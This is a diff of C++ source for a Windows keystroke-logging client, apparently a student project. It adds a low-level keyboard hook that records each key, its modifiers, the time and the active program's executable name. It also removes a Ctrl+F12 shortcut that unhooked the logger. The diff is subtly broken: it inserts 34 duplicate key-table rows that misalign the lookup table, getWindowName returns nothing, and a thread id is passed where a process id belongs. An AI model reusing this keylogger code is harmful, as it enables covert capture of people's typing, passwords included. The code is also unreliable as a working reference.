@@ -105,6 +105,40 @@ std::string gVirtualKeyCode[255][3] = {
 	{ "Numeric keypad 4", "Numeric keypad 4", "Numeric keypad 4" },									// VK_NUMPAD4	0x64
 	{ "Numeric keypad 5", "Numeric keypad 5", "Numeric keypad 5" },									// VK_NUMPAD5	0x65
 	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
+	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
+	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
+	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
+	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
+	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
+	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
+	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
+	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
+	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
+	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
+	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
+	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
+	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
+	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
+	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
+	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
+	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
+	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
+	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
+	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
+	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
+	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
+	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
+	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
+	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
+	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
+	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
+	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
+	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
+	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
+	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
+	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
+	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
+	{ "Numeric keypad 6", "Numeric keypad 6", "Numeric keypad 6" },									// VK_NUMPAD6	0x66
 	{ "Unassigned", "Unassigned", "Unassigned" },													// -			0x8A
 	{ "Unassigned", "Unassigned", "Unassigned" },													// -			0x8B
 	{ "Unassigned", "Unassigned", "Unassigned" },													// -			0x8C
@@ -224,7 +258,7 @@ std::string gVirtualKeyCode[255][3] = {
 };
 extern Client clt;
 
-Client::Client() : m_Alt(false), m_Shift(false), m_Ctrl(false), m_CapsLock(false)
+Client::Client() : m_Alt(false), m_Shift(false), m_Ctrl(false), m_CapsLock(false), m_AltGr(false)
 {
 }
 
@@ -288,6 +322,11 @@ void		Client::setCapsLock(bool capsLock)
 	m_CapsLock = capsLock;
 }
 
+void		Client::setAltGr(bool altGr)
+{
+	m_AltGr = altGr;
+}
+
 bool		Client::getShift(void)
 {
 	return (m_Shift);
@@ -306,6 +345,20 @@ bool		Client::getAlt(void)
 bool		Client::getCapsLock(void)
 {
 	return (m_CapsLock);
+}
+
+bool		Client::getAltGr(void)
+{
+	return (m_AltGr);
+}
+
+int		Client::getMod(void)
+{
+	if (m_Shift)
+		return (1);
+	else if (m_AltGr)
+		return (2);
+	return (0);
 }
 
 void		Client::addEvent(Event &e)
@@ -356,80 +409,92 @@ void		Client::getMACAddress(void)
 	}
 }
 
-LRESULT CALLBACK KeyboardProc(_In_ int nCode, _In_ WPARAM wParam, _In_ LPARAM lParam)
+void				setModifier(int nCode, WPARAM wParam, LPARAM lParam)
 {
-	bool ctrl = false;
 	KBDLLHOOKSTRUCT		*a;
+
+	a = (KBDLLHOOKSTRUCT*)lParam;
+	std::cout << a->vkCode << std::endl;
+	switch (a->vkCode)
+	{
+	case VK_LSHIFT:
+	case VK_RSHIFT:
+		if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
+			clt.setShift(true);
+		else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP)
+			clt.setShift(false);
+		break;
+	case VK_MENU:
+		if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
+			clt.setAlt(true);
+		else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP)
+			clt.setAlt(false);
+		break;
+	case VK_CONTROL:
+		if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
+			clt.setCtrl(true);
+		else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP)
+			clt.setCtrl(false);
+		break;
+	case VK_CAPITAL:
+		if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
+			clt.setCapsLock(true);
+		else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP)
+			clt.setCapsLock(false);
+	default:
+		break;
+	}
+}
+
+std::string			getWindowName()
+{
+	std::string winName("");
+
+	HWND		fWin = GetForegroundWindow();
+	if (fWin)
+	{
+		DWORD	threadId;
+		GetWindowThreadProcessId(fWin, &threadId);
+		HANDLE	hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, false, threadId);
+		if (hProcess)
+		{
+			char	name[256];
+
+			if (GetModuleFileNameEx(hProcess, NULL, name, sizeof(name)))
+				winName = name;
+		}
+	}
+}
+
+LRESULT CALLBACK	KeyboardProc(_In_ int nCode, _In_ WPARAM wParam, _In_ LPARAM lParam)
+{
+	KBDLLHOOKSTRUCT		*hookInfo;
 		
 	if (nCode == HC_ACTION)
 	{
-		a = (KBDLLHOOKSTRUCT*)lParam;
-		std::cout << a->vkCode << std::endl;
-		switch (a->vkCode)
-		{
-			case VK_LSHIFT:
-			case VK_RSHIFT:
-				if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
-					clt.setShift(true);
-				else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP)
-					clt.setShift(false);
-				break;
-			case VK_MENU:
-				if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
-					clt.setAlt(true);
-				else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP)
-					clt.setAlt(false);
-				break;
-			case VK_CONTROL:
-				if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
-					clt.setCtrl(true);
-				else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP)
-					clt.setCtrl(false);
-				break;
-			case VK_CAPITAL:
-				if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
-					clt.setCapsLock(true);
-				else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP)
-					clt.setCapsLock(false);
-			default:
-				break;
-		}
-		Key key(gVirtualKeyCode[a->vkCode][0], a->vkCode);
-		Modifier mod(clt.getCtrl(), clt.getAlt(), clt.getShift(), clt.getCapsLock());
-		if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)	
-			KeyboardEvent kbEv(key, mod, Pressed, 0, "");
+		setModifier(nCode, wParam, lParam);
+		hookInfo = (KBDLLHOOKSTRUCT*)lParam;
+		Key			key(gVirtualKeyCode[hookInfo->vkCode][clt.getMod()], hookInfo->vkCode);
+		Modifier	mod(clt.getCtrl(), clt.getAlt(), clt.getShift(), clt.getCapsLock());
+		eEventType	etype;
+		std::string	winName = getWindowName();
+
+		if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
+			etype = Pressed;
 		else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP)
-			KeyboardEvent kbEv(key, mod, Released, 0, "");
+			etype = Released;
 
-		ctrl = GetAsyncKeyState(VK_CONTROL) >> ((sizeof(SHORT) * 8) - 1);
-		if (a->vkCode == VK_F12 && ctrl)
-		{
-			clt.unsetKeyboardHook();
-		}
+		KeyboardEvent kbEv(key, mod, etype, hookInfo->time, winName);
+		clt.addEvent(kbEv);
 	}
-	//
-	// Créer un instance de KeyboardEvent ici !
-	//
-
-	//
-	// Récupérer la fenêtre active :
-	// HWND GetForegroundWindow()
-	//
-	// Nom de la fenêtre active : 
-	// GetWindowTextA(HWND window, char *name, sizeof(name))
-	// Windows limite le nom des fenêtres à 255 caractères donc "char name[256]"
-	//
-	// Nom de l'exécutable :
-	// DWORD ThreadId =	GetWindowsThreadProcessId(HWND window, NULL)
-	// HANDLE WINAPI hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, false, ThreadId)
-	// if (hProcess != NULL)
-	// len = GetModuleFileNameEx(hProcess, NULL, char *name, sizeof(name))
-	//
 	return (CallNextHookEx(NULL, nCode, wParam, lParam));
 }
 
 LRESULT CALLBACK MouseProc(_In_ int nCode, _In_ WPARAM wParam, _In_ LPARAM lParam)
 {
+	if (nCode == HC_ACTION)
+	{
 
+	}
 	return (CallNextHookEx(NULL, nCode, wParam, lParam));
 }
